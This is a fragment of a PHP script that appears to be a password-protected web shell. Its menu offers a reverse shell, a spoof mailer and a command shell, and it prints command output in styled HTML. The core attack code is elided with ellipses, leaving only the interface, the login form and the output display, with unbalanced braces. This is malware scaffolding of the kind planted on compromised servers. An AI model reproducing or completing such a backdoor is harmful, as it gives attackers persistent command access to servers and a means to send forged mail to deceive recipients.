...
echo'<center><a href="?page=1">Reverse Shell</a> <a href="?page=2">Spoof Mailer</a> <a href="?page=3">Shell</a></center>';
if (isset($_GET['page'])){
if ($_GET['page'] == 1) {
...
echo '<center><pre><marquee behavior="alternate" width=100 height=20><font color="#00688B">&#8711;</font color></marquee><br /><font face="Cooper Black" color="#00688B">'.$output.'</font></pre></center>'
;
}
}
}
else{
echo'<form method = "POST"> <center><font face="Cooper Black color="#00688B">Pass:</font><input type="password" name="pass"/>
<input type="submit" name="submit" />'; 
}
?>
